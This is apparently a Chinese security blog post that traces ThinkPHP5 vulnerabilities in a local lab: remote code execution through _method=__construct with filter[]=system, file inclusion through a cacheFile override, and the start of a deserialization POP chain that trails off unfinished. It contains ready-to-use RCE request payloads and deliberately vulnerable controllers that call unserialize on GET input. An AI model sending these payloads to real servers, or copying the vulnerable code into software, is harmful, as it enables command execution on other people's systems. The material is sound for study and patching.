<h4 id="ThinkPHP5漏洞分析之代码执行（三）"><a href="#ThinkPHP5漏洞分析之代码执行（三）" class="headerlink" title="ThinkPHP5漏洞分析之代码执行（三）"></a>ThinkPHP5漏洞分析之代码执行（三）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本： </span><br><span class="line">5.0.0&lt;=ThinkPHP5&lt;=5.0.23 、5.1.0&lt;=ThinkPHP&lt;=5.1.30</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.13</span></span><br><span class="line">POST /?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;<span class="built_in">filter</span>[]=system</span><br><span class="line"></span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span></span><br><span class="line">POST /</span><br><span class="line">_method=__construct&amp;<span class="built_in">filter</span>[]=system&amp;server[REQUEST_METHOD]=ls -al</span><br><span class="line"></span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span></span><br><span class="line">POST /?s=xxx HTTP/<span class="number">1.1</span></span><br><span class="line">_method=__construct&amp;<span class="built_in">filter</span>[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line">_method=__construct&amp;<span class="built_in">filter</span>[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>



<p>例如</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/thinkphpvul/tpdemo4/public/?s=index/index</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>56</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-oxygene">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=&amp;<span class="title function_">filter</span>%5<span class="title function_">B</span>%5<span class="title function_">D</span>=<span class="title function_">system</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/18/image5d1dd3b92751ea20.png" alt="image5d1dd3b92751ea20.png"></p>
<p>流程分析：</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image6c194e542d8abd56.png" alt="image6c194e542d8abd56.png"></p>
<p>当我们是通过post提交数据时在thinkphp/library/think/Request.php下的method方法时</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image8c064d4a0170b0a3.png" alt="image8c064d4a0170b0a3.png"></p>
<p><strong>Request</strong> 类的 <strong>__construct</strong> 方法中存在类属性覆盖的功能</p>
<p><img src="https://cdnjson.com/images/2023/05/18/image5cf6ba2d9fe2f4cd.png" alt="image5cf6ba2d9fe2f4cd.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;</span><br></pre></td></tr></table></figure>

<p>然后我们回到之前，start.php文件分发完请求之后调用了app.php下的run()方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imageecea46bad0ed4e66.png" alt="imageecea46bad0ed4e66.png"><img src="https://cdnjson.com/images/2023/05/19/image28811b7da296f824.png" alt="image28811b7da296f824.png"></p>
<p>调用了param方法，这里调用了method方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image5bf30a018274c7dc.png" alt="image5bf30a018274c7dc.png"></p>
<p>内部又调用了server方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imagef122925c9e9c6c9a.png" alt="imagef122925c9e9c6c9a.png"></p>
<p>这个 <strong>$this-&gt;server</strong> 的值，我们可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image65e86e3c895db072.png" alt="image65e86e3c895db072.png"></p>
<p>可控数据作为 <strong>$data</strong> 传入 <strong>input</strong> 方法，然后 <strong>$data</strong> 会被 <strong>filterValue</strong> 方法使用 <strong>$filter</strong> 过滤器处理。其中 <strong>$filter</strong> 的值部分来自 <strong>$this-&gt;filter</strong> ，又是可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值。</p>
<p>回到thinkphp/library/think/Request.php中</p>
<p>简单来说这个洞就是通过post传入数据之后，在construct构造函数中，我们可以通过传入的内容进行类属性覆盖</p>
<p>根据程序执行流程，我们首先调用了app下的run方法–&gt;param方法–&gt;method方法–&gt;server方法–&gt;input方法</p>
<p>也就是说我们利用类属性覆盖将我们传入的覆盖了input方法的传入的参数</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image28c6ba486af3d423.png" alt="image28c6ba486af3d423.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/19/image177b5988f209a7d8.png" alt="image177b5988f209a7d8.png"></p>
<p>在这个input方法中执行了filterValue方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imagea92e913a12b80c0c.png" alt="imagea92e913a12b80c0c.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/19/image4b1687911548b8e5.png" alt="image4b1687911548b8e5.png"></p>
<p>在这个filterValue方法中，调用了call_user_func这个回调函数（危险函数）</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image7888b9ac5229413a.png" alt="image7888b9ac5229413a.png"></p>
<p>也就是说我们令其第一个参数（是一个数组）为我们调用的函数system，第二个参数就是命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br></pre></td></tr></table></figure>

<p>调用filterValue方法的第一个参数是值，第三个参数是调用的函数名</p>
<p>在input方法中调用filterValue是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure>

<p>也就是说$data是对应着$value，而$filters是对应着system</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>

<p>传入的$data数组，内部经过处理获取了值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">return</span> $<span class="title">this</span>-&gt;<span class="title">input</span>(<span class="params"><span class="variable">$this</span>-&gt;server, <span class="literal">false</span> === <span class="variable">$name</span> ? <span class="literal">false</span> : strtoupper(<span class="params"><span class="variable">$name</span></span>), <span class="variable">$default</span>, <span class="variable">$filter</span></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这个$this-&gt;server我们可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;server = <span class="variable">$_SERVER</span>;</span><br></pre></td></tr></table></figure>

<p>根据我们的请求包：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=index/index <span class="comment">// 是访问访问 IndexController 下的 index 控制器</span></span><br><span class="line">_method=__construct <span class="comment">// 实际上是通过_method来触发request.php下的构造函数，利用这个类属性覆盖的功能，执行任何一个公共方法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在调用 <code>$this-&gt;filterValue($data, $name, $filter)</code> 方法时</p>
<p><code>$data = [&#39;s&#39; =&gt; &#39;whoami&#39;]</code></p>
<p>在 <code>filterValue</code> 方法内部，如果 <code>$name</code> 不为空，则会从 <code>$data</code> 中取出对应的参数值，并将其保存到 <code>$value</code> 变量中。</p>
<h3 id="ThinkPHP5-文件包含篇"><a href="#ThinkPHP5-文件包含篇" class="headerlink" title="ThinkPHP5-文件包含篇"></a>ThinkPHP5-文件包含篇</h3><p>通过以下命令获取测试环境代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure>

<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建 <strong>application/index/view/index/index.html</strong> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 <strong>1.jpg</strong> 放至 <strong>public</strong> 目录下（模拟上传图片操作）。接着访问 <strong><a target="_blank" rel="noopener" href="http://localhost:8000/index/index/index?cacheFile=demo.php">http://localhost:8000/index/index/index?cacheFile=demo.php</a></strong> 链接，即可触发 <strong>文件包含漏洞</strong> 。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/thinkphpvul/tpdemo8/public/index.php/index/index/index?cacheFile=1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/19/image.png" alt="image.png"></p>
<p>这里我们的代码是：将get方式传入的东西通过assign方法之后赋值给模板</p>
<p>thinkphp/library/think/Controller.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是调用了view下的assign方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image3cfdf8d5d2e907da.png" alt="image3cfdf8d5d2e907da.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/19/image2c4e4b5d76c3f896.png" alt="image2c4e4b5d76c3f896.png"></p>
<p>并将内容放在data中，程序开始调用 <strong>fetch</strong> 方法加载模板输出</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imagef86a2dfe44fbb7a5.png" alt="imagef86a2dfe44fbb7a5.png"><img src="https://cdnjson.com/images/2023/05/19/imagec98a03245505aa56.png" alt="imagec98a03245505aa56.png"></p>
<p>这里第164行，调用了engine方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;engine-&gt;<span class="variable">$method</span>(<span class="variable">$template</span>, <span class="variable">$vars</span>, <span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/19/image3ba969da79973a0f.png" alt="image3ba969da79973a0f.png"></p>
<p>这里调用下了\think\view\driver\Think.php下的fetch方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imagec3e89ec08cbbc444.png" alt="imagec3e89ec08cbbc444.png"></p>
<p>我们跟进到 <strong>Template</strong> 类的 <strong>fetch</strong> 方法，可以发现可控变量 <strong>$vars</strong> 赋值给 <strong>$this-&gt;data</strong> 并最终传入 <strong>File</strong> 类的 <strong>read</strong> 方法。</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image4a232259c7453f97.png" alt="image4a232259c7453f97.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/19/imageecf87775e96408ef.png" alt="imageecf87775e96408ef.png"></p>
<p>在thinkphp/library/think/template/driver/File.php中</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imagec43764d4586d60a8.png" alt="imagec43764d4586d60a8.png"></p>
<p>这里用extract变量覆盖了之后直接包含了$cacheFile，可以通过 <strong>extract</strong> 函数，直接覆盖 <strong>$cacheFile</strong> 变量，因为 <strong>extract</strong> 函数中的参数 <strong>$vars</strong> 可以由用户控制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$vars</span>, EXTR_OVERWRITE);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$cacheFile</span>;</span><br></pre></td></tr></table></figure>

<p>.</p>
<h3 id="ThinkPHP5-反序列化篇"><a href="#ThinkPHP5-反序列化篇" class="headerlink" title="ThinkPHP5-反序列化篇"></a>ThinkPHP5-反序列化篇</h3><h4 id="ThinkPHP5-0-X反序列化（5-0-24）"><a href="#ThinkPHP5-0-X反序列化（5-0-24）" class="headerlink" title="ThinkPHP5.0.X反序列化（5.0.24）"></a>ThinkPHP5.0.X反序列化（5.0.24）</h4><p>漏洞测试环境：PHP5.6+Linux+ThinkPHP5.0.24</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.24 tpdemo</span><br><span class="line"></span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">        &quot;topthink/framework&quot;: &quot;5.0.24&quot;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>漏洞测试代码 <strong>application/index/controller/Index.php</strong> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to thinkphp5.0.24&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>POP</strong> 链入口点为 <strong>think\process\pipes:__destruct</strong> 方法。通过 <strong>__destruct</strong> 方法里调用的 <strong>removeFiles</strong> 方法，可以利用 <strong>file_exists</strong> 函数来触发任意类的 <strong>__toString</strong> 方法，这里我们选择 <strong>think\Model</strong> 类来触发。由于该类为抽象类，所以我们后续在构造 <strong>EXP</strong> 的时候得使用其子类，例如： <strong>think\Model\Pivot</strong> 类。</p>
<p>thinkphp/library/think/process/pipes/Windows.php下的__destruct方法</p>
<p>里调用的 <strong>removeFiles</strong> 方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/imageefc35ab3ec30a5de.png" alt="imageefc35ab3ec30a5de.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/19/image58a5f697eb81f533.png" alt="image58a5f697eb81f533.png"></p>
<p>利用 <strong>file_exists</strong> 函数来触发任意类[thinkphp/library/think/Model.php下的]的 <strong>__toString</strong> 方法[当类被当成字符串时触发__ toString]</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image407bbb24ede55f6d.png" alt="image407bbb24ede55f6d.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/19/imagebd133d96038582be.png" alt="imagebd133d96038582be.png"></p>
<p>这里又调用了toArray方法</p>
<p>在 PHP 中，<code>__call</code> 是一种魔术方法，用于处理调用一个不存在的方法时的行为。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;您调用的方法 <span class="subst">$name</span> 不存在！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">nonexistentMethod</span>(); <span class="comment">// 调用不存在的方法</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>nonexistentMethod方法并不存在就会执行输出：您调用的方法 nonexistentMethod 不存在！</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image3d60af507fdb9891.png" alt="image3d60af507fdb9891.png"></p>
<p>这里的$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</p>
<p>第三处，也就是第912行，这个需要我们控制$value变量</p>
<p>这个$value是根据如下而来的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br></pre></td></tr></table></figure>

<p>分析getRelationData方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image966a53ae81e2c771.png" alt="image966a53ae81e2c771.png"></p>
<p>如果我们令if成立</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = $this-&gt;parent;</span><br></pre></td></tr></table></figure>

<p>满足条件需要三个条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li><code>$this-&gt;parent</code>存在且可控</li>
<li><code>!$modelRelation-&gt;isSelfRelation()</code>这里的isSelfRelation方法跟入，如下，存在且可控</li>
</ol>
<p><img src="https://cdnjson.com/images/2023/05/19/image350be60b0bd3e014.png" alt="image350be60b0bd3e014.png"></p>
<ol start="3">
<li><code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code></li>
</ol>
<p>跟进getModel方法，<code>$this-&gt;query-&gt;getModel()</code>，其中$query可控</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image6bd71b355f858471.png" alt="image6bd71b355f858471.png"></p>
<p>接下来看怎么能传入一个<code>Relation类</code>的$modelRelation参数</p>
<p>回过去，当我们912行$value存在的话，执行<code>$value-&gt;getAttr($attr)</code></p>
<p>跟入getAttr方法</p>
<p><img src="https://cdnjson.com/images/2023/05/19/image17f6508df1e76fe9.png" alt="image17f6508df1e76fe9.png"><img src="https://cdnjson.com/images/2023/05/19/image62622351aa306c7a.png" alt="image62622351aa306c7a.png"></p>
<p>在getAttr方法内部，跟进<code>Loader::parseName</code></p>
<p><img src="https://cdnjson.com/images/2023/05/21/image8a1b73b15d04d28f.png" alt="image8a1b73b15d04d28f.png"></p>
<p>该方法只是进行了一些大小写替换之类的</p>
<p><img src="https://cdnjson.com/images/2023/05/21/image82f0a0fd98a72fc5.png" alt="image82f0a0fd98a72fc5.png"></p>
<p>在$relation可控的前提下，要满足这个method_exists，则需要将$relation设定为$this（也就是thinkphp\library\think\Model.php）中存在的方法</p>
<p>然后回到toarray方法中，在进入__call前的两个if</p>
<p>第一个if这里要满足$modelRelation下存在getBindAttr方法</p>
<p><img src="https://cdnjson.com/images/2023/05/21/image415f421817c93dd7.png" alt="image415f421817c93dd7.png"></p>
<p>getBindAttr方法在thinkphp/library/think/model/relation/OneToOne.php中，在OneToOne.php中定义，该类是个抽象类，且OneToOne类是Relation类的派生类，其$this-&gt;bindAttr可控</p>
<p><img src="https://cdnjson.com/images/2023/05/21/image327415619f712666.png" alt="image327415619f712666.png"></p>
<p>我们搜索继承OneToOne的类，发现HasOne类</p>
<p><img src="https://cdnjson.com/images/2023/05/21/image2b0d5dd14469a473.png" alt="image2b0d5dd14469a473.png"></p>
<p>所以可以<code>让$modelRelation的值为HasOne</code>，这个也满足<code>getRelationData()传入的是Relation类对象</code>的要求，并且bindAttr可控</p>
<p>然后我们执行<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>，这里由于调用不存在的方法就直接进入__call方法中</p>
<h4 id="ThinkPHP5-0-X反序列化（5-2-24）"><a href="#ThinkPHP5-0-X反序列化（5-2-24）" class="headerlink" title="ThinkPHP5.0.X反序列化（5.2.24）"></a>ThinkPHP5.0.X反序列化（5.2.24）</h4><h4 id="ThinkPHP5-1-X反序列化（5-1-24）"><a href="#ThinkPHP5-1-X反序列化（5-1-24）" class="headerlink" title="ThinkPHP5.1.X反序列化（5.1.24）"></a>ThinkPHP5.1.X反序列化（5.1.24）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  composer create-project --prefer-dist topthink/think tp5137</span><br><span class="line">➜  cd tp5137</span><br><span class="line">➜  vim composer.json # 把&quot;topthink/framework&quot;: &quot;5.1.*&quot;改成&quot;topthink/framework&quot;: &quot;5.1.37&quot;</span><br><span class="line">➜  composer update</span><br></pre></td></tr></table></figure>

<p>将 <strong>application/index/controller/Index.php</strong> 代码修改成如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$u</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hhh&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li><p>有一个内容完全可控的反序列化点，例如： <code>unserialize(可控变量)</code> </p>
</li>
